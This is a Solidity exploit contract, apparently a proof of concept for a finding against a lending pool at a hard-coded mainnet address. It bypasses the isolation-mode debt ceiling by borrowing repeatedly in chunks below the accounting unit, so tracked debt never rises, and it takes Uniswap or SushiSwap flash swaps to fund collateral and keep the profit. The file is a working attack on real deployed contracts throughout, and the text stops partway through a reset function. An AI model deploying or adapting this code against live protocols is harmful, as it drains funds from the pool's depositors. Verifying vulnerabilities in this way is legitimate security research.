// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
  function balanceOf(address account) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transfer(address to, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
  function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
  function getPriceOracle() external view returns (address);
}

interface IUniswapV2FactoryLike {
  function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
  function token0() external view returns (address);

  function token1() external view returns (address);

  function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
  function getAmountsIn(
    uint256 amountOut,
    address[] calldata path
  ) external view returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);
}

struct ReserveConfigurationMap {
  uint256 data;
}

struct ReserveData {
  ReserveConfigurationMap configuration;
  uint128 liquidityIndex;
  uint128 currentLiquidityRate;
  uint128 variableBorrowIndex;
  uint128 currentVariableBorrowRate;
  uint128 currentStableBorrowRate;
  uint40 lastUpdateTimestamp;
  uint16 id;
  address hTokenAddress;
  address stableDebtTokenAddress;
  address variableDebtTokenAddress;
  address interestRateStrategyAddress;
  uint128 accruedToTreasury;
  uint128 unbacked;
  uint128 isolationModeTotalDebt;
}

interface IPoolLike {
  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

  function borrow(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
  ) external;

  function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

  function getReserveData(address asset) external view returns (ReserveData memory);

  function getReservesList() external view returns (address[] memory);

  function ADDRESSES_PROVIDER() external view returns (address);
}

contract FlawVerifier {
  IPoolLike internal constant POOL =
    IPoolLike(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);

  address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
  address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
  address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

  uint256 internal constant VARIABLE_RATE_MODE = 2;
  uint256 internal constant ACTIVE_BIT = 56;
  uint256 internal constant FROZEN_BIT = 57;
  uint256 internal constant BORROWING_BIT = 58;
  uint256 internal constant PAUSED_BIT = 60;
  uint256 internal constant BORROWABLE_IN_ISOLATION_BIT = 61;
  uint256 internal constant DECIMALS_BIT = 48;
  uint256 internal constant DEBT_CEILING_BIT = 212;
  uint256 internal constant DEBT_CEILING_MASK = (1 << 40) - 1;
  uint256 internal constant MAX_SINGLE_TX_BORROW_LOOPS = 256;
  uint256 internal constant LOOP_GAS_FLOOR = 350_000;

  uint8 public constant REASON_NONE = 0;
  uint8 public constant REASON_NO_ISOLATED_COLLATERAL = 1;
  uint8 public constant REASON_NO_BORROWABLE_ISOLATION_ASSET = 2;
  uint8 public constant REASON_SUB_UNIT_BORROW_NOT_POSSIBLE = 3;
  uint8 public constant REASON_LIQUIDITY_BELOW_REMAINING_CEILING = 4;
  uint8 public constant REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS = 5;
  uint8 public constant REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING = 6;
  uint8 public constant REASON_BORROW_REVERTED_BEFORE_BYPASS = 7;

  address private _profitToken;
  uint256 private _profitAmount;

  address public selectedCollateralAsset;
  address public selectedDebtAsset;
  uint256 public selectedCollateralBalance;
  uint256 public selectedUnderlyingCollateralBalance;
  uint256 public selectedHTokenCollateralBalance;
  uint256 public selectedCollateralLtv;
  uint256 public selectedDebtCeiling;
  uint256 public selectedDebtDecimals;
  uint256 public selectedDebtAssetLiquidity;
  uint256 public accountingUnitRaw;
  uint256 public borrowChunkRaw;
  uint256 public trackedDebtBefore;
  uint256 public trackedDebtAfter;
  uint256 public remainingCeilingUnitsBefore;
  uint256 public actualCeilingToBypassRaw;
  uint256 public requiredBorrowLoops;
  uint256 public executedBorrowLoops;
  uint256 public actualBorrowedRaw;
  uint8 public infeasibilityReason;
  bool public hypothesisValidated;
  bool public ceilingBypassed;

  uint256 public scannedReserveCount;
  uint256 public isolatedCollateralReserveCount;
  uint256 public borrowableIsolationReserveCount;
  uint256 public lastScannedConfigData;
  address public lastScannedReserve;

  address public poolPriceOracle;
  uint256 public selectedCollateralOraclePrice;
  uint256 public selectedDebtOraclePrice;
  uint256 public maxBorrowableAgainstHeldCollateralRaw;
  uint256 public requiredCollateralValueBase;
  uint256 public bootstrapFundingCostInDebtAssetRaw;
  uint256 public bootstrapProfitShortfallRaw;

  address public selectedFlashPair;
  address public selectedFlashRouter;
  address public selectedFlashPathMid;
  uint256 public selectedFlashCollateralTopUpRaw;
  uint256 public selectedFlashBorrowAmountRaw;
  uint256 public selectedFlashRepayAmountRaw;

  address private _activeFlashPair;
  address private _activeFlashRouter;
  address private _activeFlashPathMid;
  uint256 private _activeFlashPathLength;
  uint256 private _activeFlashCollateralTopUpRaw;
  uint256 private _activeFlashBorrowAmountRaw;
  uint256 private _activeFlashRepayAmountRaw;
  uint256 private _activeFlashStartingDebtBalance;

  struct Opportunity {
    address collateralAsset;
    uint256 underlyingCollateralBalance;
    uint256 hTokenCollateralBalance;
    uint256 totalCollateralBalance;
    uint256 collateralLtv;
    uint256 collateralDecimals;
    uint256 collateralOraclePrice;
    uint256 debtCeiling;
    uint256 trackedDebt;
    uint256 remainingCeilingUnits;
    address debtAsset;
    uint256 debtAssetLiquidity;
    uint256 debtDecimals;
    uint256 debtOraclePrice;
    uint256 maxBorrowableRaw;
    uint256 targetBorrowRaw;
    uint256 borrowLoops;
  }

  struct CollateralContext {
    address collateralAsset;
    uint256 underlyingCollateralBalance;
    uint256 hTokenCollateralBalance;
    uint256 totalCollateralBalance;
    uint256 collateralLtv;
    uint256 collateralDecimals;
    uint256 collateralOraclePrice;
    uint256 debtCeiling;
    uint256 trackedDebt;
    uint256 remainingCeilingUnits;
  }

  struct FlashPlan {
    address pair;
    address router;
    address pathMid;
    uint8 pathLength;
    uint256 collateralTopUpRaw;
    uint256 flashBorrowAmountRaw;
    uint256 flashRepayAmountRaw;
    uint256 expectedNetProfitRaw;
  }

  constructor() {}

  function executeOnOpportunity() external {
    _resetRunState();

    Opportunity memory directOpportunity = _discoverDirectOpportunity();
    if (directOpportunity.collateralAsset != address(0) && directOpportunity.debtAsset != address(0)) {
      _applyOpportunity(directOpportunity);
      _runDirectPath(directOpportunity);
      return;
    }

    Opportunity memory flashOpportunity = _discoverFlashOpportunity();
    if (flashOpportunity.collateralAsset == address(0)) {
      if (isolatedCollateralReserveCount == 0) {
        infeasibilityReason = REASON_NO_ISOLATED_COLLATERAL;
      } else if (borrowableIsolationReserveCount == 0) {
        infeasibilityReason = REASON_NO_BORROWABLE_ISOLATION_ASSET;
      } else {
        infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
      }
      return;
    }

    _applyOpportunity(flashOpportunity);
    if (selectedFlashPair == address(0) || selectedFlashRouter == address(0)) {
      infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
      return;
    }

    _runFlashswapPath();
  }

  function profitToken() external view returns (address) {
    return _profitToken;
  }

  function profitAmount() external view returns (uint256) {
    return _profitAmount;
  }

  function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
    require(msg.sender == _activeFlashPair && _activeFlashPair != address(0), "FLASH_CALLBACK");

    uint256 flashBorrowed = amount0 == 0 ? amount1 : amount0;
    require(flashBorrowed == _activeFlashBorrowAmountRaw, "FLASH_AMOUNT");

    address[] memory path = new address[](_activeFlashPathLength);
    path[0] = selectedDebtAsset;
    if (_activeFlashPathLength == 2) {
      path[1] = selectedCollateralAsset;
    } else {
      path[1] = _activeFlashPathMid;
      path[2] = selectedCollateralAsset;
    }

    if (_activeFlashCollateralTopUpRaw != 0) {
      _safeApprove(selectedDebtAsset, _activeFlashRouter, _activeFlashBorrowAmountRaw);
      IUniswapV2RouterLike(_activeFlashRouter).swapTokensForExactTokens(
        _activeFlashCollateralTopUpRaw,
        _activeFlashBorrowAmountRaw,
        path,
        address(this),
        block.timestamp
      );
    }

    uint256 underlyingToSupply = IERC20Like(selectedCollateralAsset).balanceOf(address(this));
    if (underlyingToSupply != 0) {
      _safeApprove(selectedCollateralAsset, address(POOL), underlyingToSupply);
      POOL.supply(selectedCollateralAsset, underlyingToSupply, address(this), 0);
    }

    // Enter isolation mode after any direct balance and flash-acquired top-up are supplied.
    POOL.setUserUseReserveAsCollateral(selectedCollateralAsset, true);

    _borrowInChunks(selectedDebtAsset);

    trackedDebtAfter = POOL.getReserveData(selectedCollateralAsset).isolationModeTotalDebt;

    _rawTransfer(selectedDebtAsset, _activeFlashPair, _activeFlashRepayAmountRaw);

    uint256 endingDebtAssetBalance = IERC20Like(selectedDebtAsset).balanceOf(address(this));
    uint256 netProfit = endingDebtAssetBalance > _activeFlashStartingDebtBalance
      ? endingDebtAssetBalance - _activeFlashStartingDebtBalance
      : 0;

    ceilingBypassed =
      actualBorrowedRaw >= actualCeilingToBypassRaw &&
      trackedDebtAfter == trackedDebtBefore;
    hypothesisValidated = ceilingBypassed;

    if (ceilingBypassed && netProfit != 0) {
      _profitToken = selectedDebtAsset;
      _profitAmount = netProfit;
      return;
    }

    revert("FLASH_BYPASS_FAILED");
  }

  function _runDirectPath(Opportunity memory opportunity) internal {
    uint256 startingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));

    if (opportunity.underlyingCollateralBalance != 0) {
      _safeApprove(opportunity.collateralAsset, address(POOL), opportunity.underlyingCollateralBalance);
      POOL.supply(opportunity.collateralAsset, opportunity.underlyingCollateralBalance, address(this), 0);
    }

    // Existing hTokens already represent previously supplied isolated collateral. Enabling collateral
    // after supplying any held underlying preserves the finding's causal path while allowing verifier-held
    // collateral to be present either as underlying or as hTokens seeded by the harness.
    POOL.setUserUseReserveAsCollateral(opportunity.collateralAsset, true);

    _borrowInChunks(opportunity.debtAsset);

    trackedDebtAfter = POOL.getReserveData(opportunity.collateralAsset).isolationModeTotalDebt;

    uint256 endingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));

    ceilingBypassed =
      actualBorrowedRaw >= actualCeilingToBypassRaw &&
      trackedDebtAfter == trackedDebtBefore;
    hypothesisValidated = ceilingBypassed;

    if (ceilingBypassed && endingDebtAssetBalance > startingDebtAssetBalance) {
      _profitToken = opportunity.debtAsset;
      _profitAmount = endingDebtAssetBalance - startingDebtAssetBalance;
      return;
    }

    infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
  }

  function _runFlashswapPath() internal {
    _activeFlashPair = selectedFlashPair;
    _activeFlashRouter = selectedFlashRouter;
    _activeFlashPathMid = selectedFlashPathMid;
    _activeFlashPathLength = selectedFlashPathMid == address(0) ? 2 : 3;
    _activeFlashCollateralTopUpRaw = selectedFlashCollateralTopUpRaw;
    _activeFlashBorrowAmountRaw = selectedFlashBorrowAmountRaw;
    _activeFlashRepayAmountRaw = selectedFlashRepayAmountRaw;
    _activeFlashStartingDebtBalance = IERC20Like(selectedDebtAsset).balanceOf(address(this));

    address token0 = IUniswapV2PairLike(selectedFlashPair).token0();
    uint256 amount0Out = token0 == selectedDebtAsset ? selectedFlashBorrowAmountRaw : 0;
    uint256 amount1Out = amount0Out == 0 ? selectedFlashBorrowAmountRaw : 0;

    // Public V2 flashswap funding is used only to source missing isolated collateral. The exploit root
    // cause stays unchanged: once the position is in isolation mode, the verifier repeatedly borrows the
    // isolation-approved asset in sub-accounting-unit chunks so each borrow adds zero tracked debt.
    (bool ok, ) = selectedFlashPair.call(
      abi.encodeWithSelector(
        IUniswapV2PairLike.swap.selector,
        amount0Out,
        amount1Out,
        address(this),
        bytes("hopelend")
      )
    );

    _clearActiveFlash();

    if (!ok && !ceilingBypassed) {
      infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
    }
  }

  function _borrowInChunks(address debtAsset) internal {
    for (uint256 i = 0; i < requiredBorrowLoops && gasleft() > LOOP_GAS_FLOOR; ++i) {
      (bool ok, ) = address(POOL).call(
        abi.encodeWithSelector(
          IPoolLike.borrow.selector,
          debtAsset,
          borrowChunkRaw,
          VARIABLE_RATE_MODE,
          0,
          address(this)
        )
      );
      if (!ok) {
        break;
      }

      ++executedBorrowLoops;
      actualBorrowedRaw += borrowChunkRaw;
      if (actualBorrowedRaw >= actualCeilingToBypassRaw) {
        break;
      }
    }
  }

  function _discoverDirectOpportunity() internal returns (Opportunity memory best) {
    address[] memory reserves = POOL.getReservesList();
    scannedReserveCount = reserves.length;

    address oracle = IPoolAddressesProviderLike(POOL.ADDRESSES_PROVIDER()).getPriceOracle();
    poolPriceOracle = oracle;

    for (uint256 i = 0; i < reserves.length; ++i) {
      address asset = reserves[i];
      ReserveData memory reserveData = POOL.getReserveData(asset);
      uint256 configData = reserveData.configuration.data;

      lastScannedReserve = asset;
      lastScannedConfigData = configData;

      if (_isUsableBorrowableIsolationAsset(configData)) {
        ++borrowableIsolationReserveCount;
      }
      if (_isUsableIsolatedCollateral(configData)) {
        ++isolatedCollateralReserveCount;
      }
    }

    for (uint256 i = 0; i < reserves.length; ++i) {
      CollateralContext memory collateral = _buildCollateralContext(reserves[i], oracle);
      if (collateral.collateralAsset == address(0) || collateral.totalCollateralBalance == 0) {
        continue;
      }

      for (uint256 j = 0; j < reserves.length; ++j) {
        Opportunity memory candidate = _buildCandidate(collateral, reserves[j], oracle);
        if (!_isExecutableDirectCandidate(candidate)) {
          continue;
        }

        if (_isBetterOpportunity(candidate, best)) {
          best = candidate;
        }
      }
    }
  }

  function _discoverFlashOpportunity() internal returns (Opportunity memory best) {
    address[] memory reserves = POOL.getReservesList();
    scannedReserveCount = reserves.length;

    address oracle = poolPriceOracle;
    if (oracle == address(0)) {
      oracle = IPoolAddressesProviderLike(POOL.ADDRESSES_PROVIDER()).getPriceOracle();
      poolPriceOracle = oracle;
    }

    isolatedCollateralReserveCount = 0;
    borrowableIsolationReserveCount = 0;

    for (uint256 i = 0; i < reserves.length; ++i) {
      address asset = reserves[i];
      ReserveData memory reserveData = POOL.getReserveData(asset);
      uint256 configData = reserveData.configuration.data;

      lastScannedReserve = asset;
      lastScannedConfigData = configData;

      if (_isUsableBorrowableIsolationAsset(configData)) {
        ++borrowableIsolationReserveCount;
      }
      if (_isUsableIsolatedCollateral(configData)) {
        ++isolatedCollateralReserveCount;
      }
    }

    FlashPlan memory bestPlan;

    for (uint256 i = 0; i < reserves.length; ++i) {
      CollateralContext memory collateral = _buildCollateralContext(reserves[i], oracle);
      if (collateral.collateralAsset == address(0)) {
        continue;
      }

      for (uint256 j = 0; j < reserves.length; ++j) {
        Opportunity memory candidate = _buildCandidate(collateral, reserves[j], oracle);
        if (!_isFlashBorrowCandidate(candidate)) {
          continue;
        }

        FlashPlan memory plan = _buildBestFlashPlan(candidate);
        if (plan.pair == address(0) || plan.expectedNetProfitRaw == 0) {
          continue;
        }

        if (
          best.collateralAsset == address(0) ||
          plan.expectedNetProfitRaw > bestPlan.expectedNetProfitRaw ||
          (
            plan.expectedNetProfitRaw == bestPlan.expectedNetProfitRaw &&
            _isBetterOpportunity(candidate, best)
          )
        ) {
          best = candidate;
          bestPlan = plan;
        }
      }
    }

    if (best.collateralAsset != address(0)) {
      selectedFlashPair = bestPlan.pair;
      selectedFlashRouter = bestPlan.router;
      selectedFlashPathMid = bestPlan.pathMid;
      selectedFlashCollateralTopUpRaw = bestPlan.collateralTopUpRaw;
      selectedFlashBorrowAmountRaw = bestPlan.flashBorrowAmountRaw;
      selectedFlashRepayAmountRaw = bestPlan.flashRepayAmountRaw;
      bootstrapFundingCostInDebtAssetRaw = bestPlan.flashRepayAmountRaw;
      bootstrapProfitShortfallRaw = best.targetBorrowRaw > bestPlan.flashRepayAmountRaw
        ? 0
        : bestPlan.flashRepayAmountRaw - best.targetBorrowRaw;
    }
  }

  function _buildCollateralContext(
    address collateralAsset,
    address oracle
  ) internal view returns (CollateralContext memory collateral) {
    ReserveData memory collateralReserve = POOL.getReserveData(collateralAsset);
    uint256 collateralConfig = collateralReserve.configuration.data;
    if (!_isUsableIsolatedCollateral(collateralConfig)) {
      return collateral;
    }

    collateral.collateralAsset = collateralAsset;
    collateral.underlyingCollateralBalance = IERC20Like(collateralAsset).balanceOf(address(this));
    collateral.hTokenCollateralBalance = IERC20Like(collateralReserve.hTokenAddress).balanceOf(
      address(this)
    );
    collateral.totalCollateralBalance =
      collateral.underlyingCollateralBalance +
      collateral.hTokenCollateralBalance;
    collateral.collateralLtv = _ltv(collateralConfig);
    collateral.collateralDecimals = _decimals(collateralConfig);
    collateral.collateralOraclePrice = IPriceOracleLike(oracle).getAssetPrice(collateralAsset);
    collateral.debtCeiling = _debtCeiling(collateralConfig);
    collateral.trackedDebt = collateralReserve.isolationModeTotalDebt;
    collateral.remainingCeilingUnits = collateral.debtCeiling > collateral.trackedDebt
      ? collateral.debtCeiling - collateral.trackedDebt
      : 0;
  }

  function _buildCandidate(
    CollateralContext memory collateral,
    address debtAsset,
    address oracle
  ) internal view returns (Opportunity memory candidate) {
    ReserveData memory debtReserve = POOL.getReserveData(debtAsset);
    uint256 debtConfig = debtReserve.configuration.data;
    if (!_isUsableBorrowableIsolationAsset(debtConfig)) {
      return candidate;
    }

    uint256 debtDecimals = _decimals(debtConfig);
    if (debtDecimals <= 2) {
      return candidate;
    }

    uint256 accountingUnit = 10 ** (debtDecimals - 2);
    uint256 chunk = accountingUnit - 1;
    uint256 targetBorrowRaw = collateral.remainingCeilingUnits == 0
      ? chunk
      : collateral.remainingCeilingUnits * accountingUnit + 1;
    uint256 debtPrice = IPriceOracleLike(oracle).getAssetPrice(debtAsset);
    uint256 maxBorrowableRaw = collateral.totalCollateralBalance == 0 ||
      collateral.collateralOraclePrice == 0 ||
      debtPrice == 0
      ? 0
      : _maxBorrowableRaw(
        collateral.totalCollateralBalance,
        collateral.collateralDecimals,
        collateral.collateralOraclePrice,
        collateral.collateralLtv,
        debtDecimals,
        debtPrice
      );

    candidate.collateralAsset = collateral.collateralAsset;
    candidate.underlyingCollateralBalance = collateral.underlyingCollateralBalance;
    candidate.hTokenCollateralBalance = collateral.hTokenCollateralBalance;
    candidate.totalCollateralBalance = collateral.totalCollateralBalance;
    candidate.collateralLtv = collateral.collateralLtv;
    candidate.collateralDecimals = collateral.collateralDecimals;
    candidate.collateralOraclePrice = collateral.collateralOraclePrice;
    candidate.debtCeiling = collateral.debtCeiling;
    candidate.trackedDebt = collateral.trackedDebt;
    candidate.remainingCeilingUnits = collateral.remainingCeilingUnits;
    candidate.debtAsset = debtAsset;
    candidate.debtAssetLiquidity = IERC20Like(debtAsset).balanceOf(debtReserve.hTokenAddress);
    candidate.debtDecimals = debtDecimals;
    candidate.debtOraclePrice = debtPrice;
    candidate.maxBorrowableRaw = maxBorrowableRaw;
    candidate.targetBorrowRaw = targetBorrowRaw;
    candidate.borrowLoops = _ceilDiv(targetBorrowRaw, chunk);
  }

  function _buildBestFlashPlan(
    Opportunity memory candidate
  ) internal view returns (FlashPlan memory bestPlan) {
    uint256 requiredTotalCollateralRaw = _requiredCollateralRaw(candidate);
    if (requiredTotalCollateralRaw <= candidate.totalCollateralBalance) {
      return bestPlan;
    }

    uint256 collateralTopUpRaw = requiredTotalCollateralRaw - candidate.totalCollateralBalance;

    FlashPlan memory uniPlan = _quoteFlashPlan(
      candidate,
      collateralTopUpRaw,
      UNISWAP_V2_FACTORY,
      UNISWAP_V2_ROUTER
    );
    FlashPlan memory sushiPlan = _quoteFlashPlan(
      candidate,
      collateralTopUpRaw,
      SUSHI_FACTORY,
      SUSHI_ROUTER
    );

    bestPlan = _pickBetterFlashPlan(uniPlan, sushiPlan);
  }

  function _quoteFlashPlan(
    Opportunity memory candidate,
    uint256 collateralTopUpRaw,
    address factory,
    address router
  ) internal view returns (FlashPlan memory plan) {
    if (candidate.debtAsset == candidate.collateralAsset || collateralTopUpRaw == 0) {
      return plan;
    }

    address pair = IUniswapV2FactoryLike(factory).getPair(candidate.debtAsset, candidate.collateralAsset);
    if (pair != address(0)) {
      address[] memory directPath = new address[](2);
      directPath[0] = candidate.debtAsset;
      directPath[1] = candidate.collateralAsset;
      plan = _quotePath(candidate, collateralTopUpRaw, router, pair, directPath, address(0));
    }

    if (candidate.debtAsset != WETH && candidate.collateralAsset != WETH) {
      address firstHopPair = IUniswapV2FactoryLike(factory).getPair(candidate.debtAsset, WETH);
      address secondHopPair = IUniswapV2FactoryLike(factory).getPair(WETH, candidate.collateralAsset);
      if (firstHopPair != address(0) && secondHopPair != address(0)) {
        address[] memory wethPath = new address[](3);
        wethPath[0] = candidate.debtAsset;
        wethPath[1] = WETH;
        wethPath[2] = candidate.collateralAsset;
        FlashPlan memory viaWeth =
          _quotePath(candidate, collateralTopUpRaw, router, firstHopPair, wethPath, WETH);
        plan = _pickBetterFlashPlan(plan, viaWeth);
      }
    }
  }

  function _quotePath(
    Opportunity memory candidate,
    uint256 collateralTopUpRaw,
    address router,
    address pair,
    address[] memory path,
    address pathMid
  ) internal view returns (FlashPlan memory plan) {
    (bool ok, uint256[] memory amountsIn) = _getAmountsIn(router, collateralTopUpRaw, path);
    if (!ok || amountsIn.length == 0) {
      return plan;
    }

    uint256 flashBorrowAmountRaw = amountsIn[0];
    uint256 flashRepayAmountRaw = _v2FlashRepayAmount(flashBorrowAmountRaw);

    if (
      flashBorrowAmountRaw == 0 ||
      flashRepayAmountRaw >= candidate.targetBorrowRaw ||
      IERC20Like(candidate.debtAsset).balanceOf(pair) < flashBorrowAmountRaw
    ) {
      return plan;
    }

    plan.pair = pair;
    plan.router = router;
    plan.pathMid = pathMid;
    plan.pathLength = uint8(path.length);
    plan.collateralTopUpRaw = collateralTopUpRaw;
    plan.flashBorrowAmountRaw = flashBorrowAmountRaw;
    plan.flashRepayAmountRaw = flashRepayAmountRaw;
    plan.expectedNetProfitRaw = candidate.targetBorrowRaw - flashRepayAmountRaw;
  }

  function _applyOpportunity(Opportunity memory opportunity) internal {
    if (opportunity.debtAsset == address(0)) {
      return;
    }

    selectedCollateralAsset = opportunity.collateralAsset;
    selectedDebtAsset = opportunity.debtAsset;
    selectedCollateralBalance = opportunity.totalCollateralBalance;
    selectedUnderlyingCollateralBalance = opportunity.underlyingCollateralBalance;
    selectedHTokenCollateralBalance = opportunity.hTokenCollateralBalance;
    selectedCollateralLtv = opportunity.collateralLtv;
    selectedCollateralOraclePrice = opportunity.collateralOraclePrice;
    selectedDebtCeiling = opportunity.debtCeiling;
    selectedDebtDecimals = opportunity.debtDecimals;
    selectedDebtAssetLiquidity = opportunity.debtAssetLiquidity;
    selectedDebtOraclePrice = opportunity.debtOraclePrice;
    trackedDebtBefore = opportunity.trackedDebt;
    remainingCeilingUnitsBefore = opportunity.remainingCeilingUnits;
    maxBorrowableAgainstHeldCollateralRaw = opportunity.maxBorrowableRaw;

    if (opportunity.debtDecimals <= 2) {
      infeasibilityReason = REASON_SUB_UNIT_BORROW_NOT_POSSIBLE;
      return;
    }

    accountingUnitRaw = 10 ** (opportunity.debtDecimals - 2);
    borrowChunkRaw = accountingUnitRaw - 1;
    actualCeilingToBypassRaw = opportunity.targetBorrowRaw;
    requiredBorrowLoops = opportunity.borrowLoops;
    requiredCollateralValueBase = _requiredCollateralValueBase(opportunity.targetBorrowRaw, opportunity);

    if (opportunity.debtAssetLiquidity < actualCeilingToBypassRaw) {
      infeasibilityReason = REASON_LIQUIDITY_BELOW_REMAINING_CEILING;
      return;
    }

    if (requiredBorrowLoops > MAX_SINGLE_TX_BORROW_LOOPS) {
      infeasibilityReason = REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS;
      return;
    }
  }

  function _isExecutableDirectCandidate(Opportunity memory candidate) internal pure returns (bool) {
    return
      candidate.collateralAsset != address(0) &&
      candidate.debtAsset != address(0) &&
      candidate.totalCollateralBalance != 0 &&
      candidate.maxBorrowableRaw >= candidate.targetBorrowRaw &&
      candidate.debtAssetLiquidity >= candidate.targetBorrowRaw &&
      candidate.borrowLoops <= MAX_SINGLE_TX_BORROW_LOOPS;
  }

  function _isFlashBorrowCandidate(Opportunity memory candidate) internal pure returns (bool) {
    return
      candidate.collateralAsset != address(0) &&
      candidate.debtAsset != address(0) &&
      candidate.debtDecimals > 2 &&
      candidate.collateralLtv != 0 &&
      candidate.collateralOraclePrice != 0 &&
      candidate.debtOraclePrice != 0 &&
      candidate.debtAssetLiquidity >= candidate.targetBorrowRaw &&
      candidate.borrowLoops <= MAX_SINGLE_TX_BORROW_LOOPS;
  }

  function _pickBetterFlashPlan(
    FlashPlan memory a,
    FlashPlan memory b
  ) internal pure returns (FlashPlan memory) {
    if (a.pair == address(0)) {
      return b;
    }
    if (b.pair == address(0)) {
      return a;
    }
    if (b.expectedNetProfitRaw > a.expectedNetProfitRaw) {
      return b;
    }
    if (b.expectedNetProfitRaw < a.expectedNetProfitRaw) {
      return a;
    }
    if (b.flashRepayAmountRaw < a.flashRepayAmountRaw) {
      return b;
    }
    return a;
  }

  function _isBetterOpportunity(
    Opportunity memory candidate,
    Opportunity memory currentBest
  ) internal pure returns (bool) {
    if (candidate.collateralAsset == address(0) || candidate.debtAsset == address(0)) {
      return false;
    }
    if (currentBest.collateralAsset == address(0)) {
      return true;
    }

    bool candidateDirect = candidate.totalCollateralBalance != 0;
    bool bestDirect = currentBest.totalCollateralBalance != 0;
    if (candidateDirect != bestDirect) {
      return candidateDirect;
    }
    if (candidate.debtDecimals != currentBest.debtDecimals) {
      return candidate.debtDecimals > currentBest.debtDecimals;
    }
    if (candidate.borrowLoops != currentBest.borrowLoops) {
      return candidate.borrowLoops < currentBest.borrowLoops;
    }
    if (candidate.targetBorrowRaw != currentBest.targetBorrowRaw) {
      return candidate.targetBorrowRaw > currentBest.targetBorrowRaw;
    }
    if (candidate.maxBorrowableRaw != currentBest.maxBorrowableRaw) {
      return candidate.maxBorrowableRaw > currentBest.maxBorrowableRaw;
    }
    return candidate.debtAssetLiquidity > currentBest.debtAssetLiquidity;
  }

  function _requiredCollateralRaw(Opportunity memory opportunity) internal pure returns (uint256) {
    uint256 collateralValueBase = _requiredCollateralValueBase(
      opportunity.targetBorrowRaw,
      opportunity
    );
    return
      _ceilDiv(
        collateralValueBase * (10 ** opportunity.collateralDecimals),
        opportunity.collateralOraclePrice
      ) + 1;
  }

  function _requiredCollateralValueBase(
    uint256 borrowAmountRaw,
    Opportunity memory opportunity
  ) internal pure returns (uint256) {
    uint256 borrowValueBase =
      (borrowAmountRaw * opportunity.debtOraclePrice) /
      (10 ** opportunity.debtDecimals);
    return _ceilDiv(borrowValueBase * 10_000, opportunity.collateralLtv);
  }

  function _maxBorrowableRaw(
    uint256 collateralBalance,
    uint256 collateralDecimals,
    uint256 collateralPrice,
    uint256 collateralLtv,
    uint256 debtDecimals,
    uint256 debtPrice
  ) internal pure returns (uint256) {
    if (
      collateralBalance == 0 ||
      collateralPrice == 0 ||
      collateralLtv == 0 ||
      debtPrice == 0
    ) {
      return 0;
    }

    uint256 collateralValueBase =
      (collateralBalance * collateralPrice) /
      (10 ** collateralDecimals);
    uint256 maxBorrowValueBase = (collateralValueBase * collateralLtv) / 10_000;
    return (maxBorrowValueBase * (10 ** debtDecimals)) / debtPrice;
  }

  function _getAmountsIn(
    address router,
    uint256 amountOut,
    address[] memory path
  ) internal view returns (bool ok, uint256[] memory amounts) {
    bytes memory data;
    (ok, data) = router.staticcall(
      abi.encodeWithSelector(IUniswapV2RouterLike.getAmountsIn.selector, amountOut, path)
    );
    if (!ok) {
      return (false, amounts);
    }
    amounts = abi.decode(data, (uint256[]));
  }

  function _v2FlashRepayAmount(uint256 amountBorrowed) internal pure returns (uint256) {
    return _ceilDiv(amountBorrowed * 1000, 997);
  }

  function _safeApprove(address token, address spender, uint256 amount) internal {
    _rawApprove(token, spender, 0);
    _rawApprove(token, spender, amount);
  }

  function _rawApprove(address token, address spender, uint256 amount) internal {
    (bool ok, bytes memory data) = token.call(
      abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
    );
    require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
  }

  function _rawTransfer(address token, address to, uint256 amount) internal {
    (bool ok, bytes memory data) = token.call(
      abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
    );
    require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
  }

  function _clearActiveFlash() internal {
    _activeFlashPair = address(0);
    _activeFlashRouter = address(0);
    _activeFlashPathMid = address(0);
    _activeFlashPathLength = 0;
    _activeFlashCollateralTopUpRaw = 0;
    _activeFlashBorrowAmountRaw = 0;
    _activeFlashRepayAmountRaw = 0;
    _activeFlashStartingDebtBalance = 0;
  }

  function _resetRunState() internal {
    _profitToken = address(0);
    _profitAmount = 0;
    selectedCollateralAsset = address(0);
    selectedDebtAsset = address(0);
    selectedCollateralBalance = 0;
    selectedUnderlyingCollateralBalance = 0;
    selectedHTokenCollateralBalance = 0;
    selectedCollateralLtv = 0;
    selectedDebtCeiling = 0;
    selectedDebtDecimals = 0;
    selectedDebtAssetLiquidity = 0;
